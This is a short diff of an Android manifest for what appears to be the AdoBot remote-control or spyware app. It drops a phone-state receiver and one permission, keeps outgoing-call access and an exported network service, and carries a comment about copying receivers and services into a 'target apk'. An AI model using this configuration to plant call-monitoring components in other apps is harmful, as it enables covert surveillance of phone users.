@@ -42,7 +42,6 @@
         android:required="true" />
 
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"></uses-permission>
-    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"></uses-permission>
 
     <application
         android:allowBackup="true"
@@ -60,13 +59,6 @@
         <!--copy the receivers and services to the target apk source-->
         <activity android:name="com.android.adobot.activities.UpdateActivity"></activity>
         <activity android:name="com.android.adobot.activities.PermissionsActivity"></activity>
-
-        <receiver android:name=".PhoneStatReceiver">
-            <intent-filter>
-                <action android:name="android.intent.action.PHONE_STATE"/>
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-            </intent-filter>
-        </receiver>
 
         <service android:name="com.android.adobot.network.NetworkSchedulerService"
             android:exported="true"
